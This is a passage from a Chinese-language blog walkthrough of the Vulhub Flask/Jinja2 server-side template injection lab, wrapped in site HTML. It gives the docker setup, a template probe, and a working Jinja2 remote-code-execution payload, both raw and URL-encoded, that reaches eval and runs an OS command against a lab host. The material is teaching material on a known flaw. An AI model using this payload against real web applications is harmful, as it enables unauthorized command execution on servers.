class="line">参考链接：</span><br><span class="line"></span><br><span class="line">- &lt;https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf&gt;</span><br><span class="line">- &lt;http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates&gt;</span><br><span class="line"></span><br><span class="line">## 环境搭建</span><br><span class="line"></span><br><span class="line">执行如下命令启动一个基于Flask 1.1.1的Web应用：</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">docker compose up -d</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">环境启动后，访问`http://your-ip:8000/`即可查看到默认页面。</span><br><span class="line"></span><br><span class="line">## 漏洞复现</span><br><span class="line"></span><br><span class="line">首先，访问以下URL验证SSTI漏洞是否存在：</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">http://your-ip:8000/?name=&#123;&#123;233*233&#125;&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">如果看到结果`54289`，则证实存在SSTI漏洞。</span><br><span class="line"></span><br><span class="line">要实现远程代码执行，可以使用以下POC获取`eval`函数并执行任意Python代码：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">访问以下URL（POC已进行URL编码）执行命令：</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">命令执行结果将会显示：</span><br><span class="line"></span><br><span class="line">![](1.png)</span><br><span class="line">                                                                                 </span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915210404818.png" alt="image-20250915210404818" data-caption="image-20250915210404818" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.196.128:8000/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915210557195.png" alt="image-20250915210557195" data-caption="image-20250915210557195" loading="lazy"></p>
+<h2 id="停止并删除容器"><a href="#停止并删除容器" class="headerlink" title="停止并删除容器"></a>停止并删除容器</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915211305567.png" alt="image-20250915211305567" data-caption="image-20250915211305567" loading="lazy"></p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/Jinja2/" rel="tag">Jinja2</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/flask/" rel="tag">flask</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1761989925207"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Flask-SSTI%E6%BC%8F%E6%B4%9E-Flask-SSTI"><span class="toc-number">1.</span> <span class="toc-text">Flask SSTI漏洞(Flask SSTI)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">读取系统文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">开启环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83vulhub%E9%87%8C%E7%9A%84wp"><span class="toc-number">2.1.</span> <span class="toc-text">参考vulhub里的wp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9C%E6%AD%A2%E5%B9%B6%E5%88%A0%E9%99%A4%E5%AE%B9%E5%99%A8"><span class="toc-number">2.2.</span> <span class="toc-text">停止并删除容器</span></a></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div></body></html>
